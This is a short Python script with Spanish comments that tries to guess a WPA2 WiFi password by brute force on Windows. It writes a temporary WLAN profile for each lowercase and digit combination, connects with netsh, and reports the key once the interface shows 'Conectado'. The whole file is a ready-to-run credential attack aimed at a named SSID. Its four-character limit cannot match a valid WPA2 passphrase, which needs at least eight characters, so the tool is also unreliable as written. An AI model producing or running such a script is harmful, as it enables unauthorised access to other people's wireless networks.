import subprocess, time
from itertools import product
import string
from datetime import datetime

ssid = "Grupo 2"  # <-- Cambia esto por el nombre exacto de tu red WiFi
caracteres = string.ascii_lowercase + string.digits  # Caracteres a probar
longitud_max = 4  # Longitud máxima de la contraseña

inicio = datetime.now()
intentos = 0

for longitud in range(1, longitud_max + 1):
    for combo in product(caracteres, repeat=longitud):
        clave = ''.join(combo)
        intentos += 1

        # Crear perfil WiFi temporal
        perfil = f"""
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
          <name>{ssid}</name>
          <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
          <connectionType>ESS</connectionType>
          <connectionMode>manual</connectionMode>
          <MSM>
            <security>
              <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
              </authEncryption>
              <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{clave}</keyMaterial>
              </sharedKey>
            </security>
          </MSM>
        </WLANProfile>"""

        with open("temp.xml", "w") as f:
            f.write(perfil)

        # Añadir perfil y conectar
        subprocess.run("netsh wlan add profile filename=temp.xml", shell=True, stdout=subprocess.DEVNULL)
        subprocess.run(f"netsh wlan connect name={ssid}", shell=True, stdout=subprocess.DEVNULL)
        time.sleep(4)  # Espera para dar tiempo a conectar

        try:
            estado = subprocess.check_output("netsh wlan show interfaces", shell=True).decode(errors="ignore")
        except subprocess.CalledProcessError:
            print("❌ No se pudo obtener el estado de red. ¿Está activado el WiFi?")
            continue

        if ssid in estado and "Conectado" in estado:
            tiempo_total = datetime.now() - inicio
            print(f"\n✅ CONTRASEÑA ENCONTRADA: {clave}")
            print(f"🔢 Intentos: {intentos}")
            print(f"⏱️ Tiempo total: {tiempo_total}")
            exit()

        # Mostrar progreso cada 10 intentos
        if intentos % 10 == 0:
            tiempo_actual = datetime.now() - inicio
            print(f"⏳ Intentos: {intentos} | Última: {clave} | Tiempo: {tiempo_actual}")
